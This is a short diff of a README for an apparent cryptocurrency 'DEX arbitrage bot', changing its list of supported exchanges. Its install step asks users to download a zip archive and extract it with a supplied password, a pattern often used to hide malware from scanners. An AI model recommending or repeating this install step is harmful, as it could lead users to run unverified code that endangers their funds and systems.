@@ -11,12 +11,11 @@ The bot continuously monitors the prices of specific assets on different DEXs, l
 ![](https://github.com/freesparrowrob/dex-arbitrage-bot/blob/main/scr.png?raw=true)
 
 #### Aviable DEXs
-- Uniswap V2
-- Balancer V2
 - Uniswap V3
+- Trader Joe
 - Sushiswap
-- Kucoin
-- dYdX
+- Pancakeswap
+- dYdX (soon)
 
 ## Install
 - [Download](https://github.com/freesparrowrob/dex-arbitrage-bot/archive/refs/heads/main.zip) the repository release and extract files with password `XvI2SJUNssB4`.
